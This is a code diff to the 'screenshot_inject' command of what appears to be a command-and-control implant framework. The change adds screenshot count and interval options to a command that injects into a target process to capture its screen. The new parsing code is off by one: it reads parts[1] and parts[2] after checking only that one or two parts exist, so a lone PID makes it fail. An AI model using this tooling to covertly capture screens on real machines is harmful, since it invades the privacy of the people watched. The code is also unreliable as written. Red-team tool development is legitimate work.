@@ -13,6 +13,8 @@ class ScreenshotInjectArguments(TaskArguments):
         super().__init__(command_line)
         self.args = {
             "pid": CommandParameter(name="PID", type=ParameterType.Number, description="Process ID to inject into."),
+            "count": CommandParameter(name="Number of Screenshots", type=ParameterType.Number, description="The number of screenshots to take when executing.", required=False, default_value=1),
+            "interval": CommandParameter(name="Interval Between Screenshots", type=ParameterType.Number, description="Interval in seconds to wait between capturing screenshots. Default 0.", required=False, default_value=0),
         }
 
     async def parse_arguments(self):
@@ -22,7 +24,16 @@ class ScreenshotInjectArguments(TaskArguments):
         if self.command_line[0] == "{":
             self.load_args_from_json_string(self.command_line)
         else:
-            self.add_arg("pid", int(self.command_line))
+            parts = self.command_line.strip().split(" ")
+            if len(parts) > 0:
+                self.args["pid"].value = int(parts[0])
+            else:
+                raise Exception("Usage: {}".format(ScreenshotInjectCommand.help_cmd))
+            if len(parts) >= 1:
+                self.args["count"].value = int(parts[1])
+            if len(parts) >= 2:
+                self.args["interval"].value = int(parts[2])
+            
         self.add_arg("pipe_name", str(uuid4()))
         pass
 
@@ -30,7 +41,7 @@ class ScreenshotInjectArguments(TaskArguments):
 class ScreenshotInjectCommand(CommandBase):
     cmd = "screenshot_inject"
     needs_admin = False
-    help_cmd = "screenshot_inject [pid]"
+    help_cmd = "screenshot_inject [pid] [count] [interval]"
     description = "Take a screenshot in the session of the target PID"
     version = 2
     is_exit = False
